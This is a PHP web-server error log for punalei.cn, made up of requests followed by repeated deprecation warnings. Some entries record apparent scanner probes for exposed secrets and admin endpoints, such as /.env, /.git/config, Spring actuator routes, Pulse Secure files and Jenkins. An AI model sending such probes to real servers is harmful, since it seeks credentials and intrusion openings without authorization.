---------------------------------------------------------------
[ 2026-03-18T00:25:43+08:00 ] 79.124.40.174 GET 120.24.147.77/?XDEBUG_SESSION_START=phpstorm
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T00:34:21+08:00 ] 192.71.3.222 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T00:59:50+08:00 ] 149.86.227.60 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T00:59:56+08:00 ] 180.153.236.55 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T00:59:56+08:00 ] 180.153.236.52 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:04:46+08:00 ] 134.209.124.232 GET 120.24.147.77/dana-na/nc/nc_gina_ver.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T01:04:46+08:00 ] 134.209.124.232 GET 120.24.147.77/dana-na/nc/nc_gina_ver.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T01:04:47+08:00 ] 134.209.124.232 GET 120.24.147.77/dana-cached/hc/HostCheckerInstaller.osx
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T01:04:47+08:00 ] 134.209.124.232 GET 120.24.147.77/dana-cached/hc/HostCheckerInstaller.osx
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T01:06:23+08:00 ] 3.143.162.210 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:12:04+08:00 ] 3.143.162.210 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:18:33+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T01:18:33+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T01:35:00+08:00 ] 3.132.26.232 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:40:59+08:00 ] 3.132.26.232 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:45:19+08:00 ] 112.43.32.173 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:48:30+08:00 ] 37.19.223.11 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:53:13+08:00 ] 58.213.165.222 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:57:40+08:00 ] 176.65.149.234 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T01:59:51+08:00 ] 52.167.144.147 GET www.punalei.cn/ldcms/zhiliudianzuchanpin.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:00:28+08:00 ] 64.226.71.148 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:00:29+08:00 ] 64.226.71.148 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:07:30+08:00 ] 79.124.40.174 GET 120.24.147.77/actuator/gateway/routes
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:07:30+08:00 ] 79.124.40.174 GET 120.24.147.77/actuator/gateway/routes
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:13:18+08:00 ] 34.158.79.105 GET 120.24.147.77/.env
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:13:19+08:00 ] 34.158.79.105 GET 120.24.147.77/.env
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:15:42+08:00 ] 139.59.116.9 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T02:19:32+08:00 ] 20.65.194.130 GET 120.24.147.77/hudson
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:19:32+08:00 ] 20.65.194.130 GET 120.24.147.77/hudson
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:19:53+08:00 ] 52.167.144.231 GET www.punalei.cn/ldcms/punaleiPNAIdangongnenganguixilie/306.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T02:20:55+08:00 ] 185.12.59.118 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T02:52:23+08:00 ] 40.77.167.76 GET www.punalei.cn/ldcms/dianzifuzaixilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T03:07:37+08:00 ] 35.179.95.186 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:07:38+08:00 ] 35.179.95.186 POST 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:09:03+08:00 ] 44.220.188.185 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:13:02+08:00 ] 198.235.24.28 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T03:18:56+08:00 ] 85.11.167.19 POST punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T03:18:56+08:00 ] 85.11.167.19 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T03:18:57+08:00 ] 85.11.167.19 POST punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
